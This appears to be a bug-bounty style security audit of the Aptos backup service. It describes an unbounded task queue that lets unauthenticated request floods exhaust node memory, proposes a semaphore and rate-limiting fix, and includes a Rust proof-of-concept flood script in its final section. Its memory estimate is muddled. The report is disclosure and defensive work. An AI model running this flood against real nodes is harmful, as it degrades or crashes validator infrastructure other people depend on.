# Audit Report

## Title
Unbounded Concurrent Backup Request Queue Allows Memory Exhaustion Attack

## Summary
The backup service's `reply_with_bytes_sender()` function spawns blocking tasks via `tokio::task::spawn_blocking` without implementing request rate limiting or concurrency controls. While the Tokio runtime limits concurrent blocking threads to 64, the queue of pending tasks is unbounded, allowing an attacker to exhaust node memory by flooding backup endpoints with parallel requests.

## Finding Description

The backup service exposes several streaming endpoints that use `reply_with_bytes_sender()` to handle large data transfers. [1](#0-0) 

Each incoming request to endpoints like `/state_snapshot/<version>`, `/state_snapshot_chunk/<version>/<start_idx>/<limit>`, `/epoch_ending_ledger_infos/<start_epoch>/<end_epoch>`, and `/transactions/<start_version>/<num_transactions>` triggers a `spawn_blocking` call. [2](#0-1) 

The backup service runtime is configured with `MAX_BLOCKING_THREADS = 64`, limiting concurrent blocking thread execution. [3](#0-2) 

However, **there is no limit on the number of queued blocking tasks**. When all 64 threads are busy, additional `spawn_blocking` calls enqueue tasks in memory. Each queued task holds:
- A closure capturing the `BackupHandler` (cloned)
- A `BytesSender` with a 100-batch channel buffer
- Endpoint metadata and timing information

The service has **no authentication mechanism** and **no rate limiting**. [4](#0-3) 

In production fullnode deployments, the backup service binds to all interfaces (`0.0.0.0:6186`). [5](#0-4) 

**Attack Path:**
1. Attacker sends thousands of concurrent HTTP GET requests to `/state_snapshot/0` or similar streaming endpoints
2. Each request spawns a blocking task via `spawn_blocking`
3. The first 64 tasks execute immediately on blocking threads
4. Remaining tasks queue in memory indefinitely
5. Each queued task consumes memory (estimated 10-100KB per task depending on closure size)
6. With 10,000 concurrent requests, approximately 1-10MB to 100MB-1GB of memory is held in the queue
7. Node experiences memory pressure, potential OOM conditions, degraded performance
8. Backup service and potentially the entire node becomes unresponsive

This breaks **Invariant #9: Resource Limits** - the system fails to enforce computational and memory limits on backup operations.

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria:
- **Validator node slowdowns**: Memory exhaustion causes performance degradation affecting block processing, consensus participation, and transaction execution
- **API crashes**: The backup service can become unresponsive or crash under memory pressure

While the backup service runs in its own runtime, severe memory exhaustion can affect the entire node process, potentially impacting:
- Consensus participation (missed proposals/votes)
- Transaction processing capacity
- State synchronization operations
- API endpoint responsiveness

The impact is amplified because backup operations involve I/O-intensive database reads, making each queued task relatively expensive in terms of resource consumption.

## Likelihood Explanation

**Likelihood: Medium to High**

**Ease of Exploitation:**
- No authentication required
- Simple HTTP GET requests
- No special privileges needed
- Trivial to script

**Attack Requirements:**
- Network access to port 6186
  - In Kubernetes: Any pod or user with cluster network access
  - In misconfigured deployments: Public internet access
  - In localhost-bound deployments: Local access or compromised service

**Mitigating Factors:**
- In default Kubernetes deployments, port 6186 is ClusterIP (internal) [6](#0-5) 
- However, cluster-internal access is often available to multiple services/users
- No defense-in-depth if the service is misconfigured to be publicly accessible

**Realistic Attack Scenarios:**
1. Malicious pod/service within the same Kubernetes cluster
2. Compromised backup client with cluster access
3. Misconfigured firewall rules exposing port 6186 publicly
4. Insider threat with cluster access

## Recommendation

Implement multi-layer protection:

**1. Request Rate Limiting per Client IP:**
Use the existing `aptos-rate-limiter` crate to limit requests per IP address. [7](#0-6) 

**2. Concurrent Request Semaphore:**
Add a semaphore to limit total concurrent streaming operations:

```rust
// In lib.rs or handlers/mod.rs
static MAX_CONCURRENT_STREAMS: Lazy<Semaphore> = 
    Lazy::new(|| Semaphore::new(10)); // Limit to 10 concurrent streams

// In reply_with_bytes_sender()
pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Result<Box<dyn Reply>, warp::Rejection>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    // Acquire permit before spawning
    let permit = MAX_CONCURRENT_STREAMS.try_acquire()
        .map_err(|_| warp::reject::custom(TooManyRequests))?;
    
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);
    let bh = backup_handler.clone();
    
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _permit = permit; // Hold permit for duration
        let _timer = BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Ok(Box::new(Response::new(Body::wrap_stream(stream))))
}
```

**3. Authentication (Optional but Recommended):**
Add token-based authentication to restrict access to authorized backup clients only.

**4. Configuration Option:**
Make the binding address configurable with default to `127.0.0.1:6186` instead of `0.0.0.0:6186` to enforce localhost-only access by default.

## Proof of Concept

```rust
// PoC: Flood backup service with concurrent requests
// File: backup_flood_poc.rs

use reqwest::Client;
use std::sync::Arc;
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() {
    let backup_service_url = "http://127.0.0.1:6186"; // Or cluster IP
    let client = Arc::new(Client::new());
    let num_requests = 1000; // Flood with 1000 concurrent requests
    
    println!("[*] Starting backup service flood attack");
    println!("[*] Target: {}", backup_service_url);
    println!("[*] Concurrent requests: {}", num_requests);
    
    let mut handles = vec![];
    
    for i in 0..num_requests {
        let client = Arc::clone(&client);
        let url = format!("{}/state_snapshot/0", backup_service_url);
        
        let handle = tokio::spawn(async move {
            match client.get(&url).send().await {
                Ok(resp) => {
                    println!("[{}] Response status: {}", i, resp.status());
                    // Don't consume body to keep connection open
                    sleep(Duration::from_secs(60)).await;
                }
                Err(e) => {
                    println!("[{}] Request failed: {}", i, e);
                }
            }
        });
        
        handles.push(handle);
        
        // Small delay to avoid overwhelming client
        if i % 100 == 0 {
            sleep(Duration::from_millis(100)).await;
        }
    }
    
    println!("[*] All requests sent, waiting for completion...");
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("[*] Attack complete");
}
```

**Expected Behavior:**
- First 64 requests execute on blocking threads
- Remaining 936 requests queue in memory
- Node memory usage increases significantly
- Backup service becomes slow or unresponsive
- May trigger OOM if memory limits are strict

## Notes

While the backup service is exposed via ClusterIP in Kubernetes (internal access only), the complete lack of authentication and rate limiting represents a security gap. The vulnerability is exploitable by:
1. Any pod or service within the cluster
2. Any user with cluster network access
3. Any external attacker if the service is misconfigured to be publicly accessible

The severity is High due to the potential for node-level resource exhaustion affecting validator operations, even though direct exploitation requires some level of network access. The fix is straightforward: implement request rate limiting and concurrency controls using existing Aptos infrastructure (`aptos-rate-limiter` crate and Tokio semaphores).

### Citations

**File:** storage/backup/backup-service/src/handlers/utils.rs (L46-65)
```rust
pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);

    // spawn and forget, error propagates through the `stream: TryStream<_>`
    let bh = backup_handler.clone();
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Box::new(Response::new(Body::wrap_stream(stream)))
}
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L49-110)
```rust
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L13-16)
```yaml
storage:
  rocksdb_configs:
    enable_storage_sharding: true
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/templates/service.yaml (L42-56)
```yaml
apiVersion: v1
kind: Service
metadata:
  name: {{ include "aptos-fullnode.fullname" . }}
  labels:
    {{- include "aptos-fullnode.labels" . | nindent 4 }}
spec:
  selector:
    {{- include "aptos-fullnode.selectorLabels" . | nindent 4 }}
    app.kubernetes.io/name: fullnode
  ports:
  - name: backup
    port: 6186
  - name: metrics
    port: 9101
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L1-5)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_infallible::{Mutex, RwLock};
use aptos_logger::debug;
```
